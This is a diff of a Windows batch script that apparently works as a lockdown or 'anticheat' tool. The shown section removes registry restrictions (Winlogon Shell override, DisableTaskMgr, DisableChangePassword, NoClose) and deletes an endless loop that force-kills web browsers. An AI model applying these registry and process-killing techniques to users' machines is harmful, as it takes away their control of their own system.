@@ -20,7 +20,7 @@ shutdown -l
 exit
 :init
 start calc
-start cum anticheat
+python\pythonw anticheat.py
 python\python skid.py
 reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /f
 reg delete "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
@@ -28,13 +28,5 @@ reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v shu
 reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /f
 reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f
 start userinit
-taskkill /f /im cmd.exe
+taskkill /f /im pythonw.exe
 exit
-:anticheat
-taskkill /f /im chrome.exe
-taskkill /f /im msedge.exe
-taskkill /f /im firefox.exe
-taskkill /f /im plasmafox.exe
-taskkill /f /im r3dfox.exe
-taskkill /f /im iexplore.exe
-goto anticheat
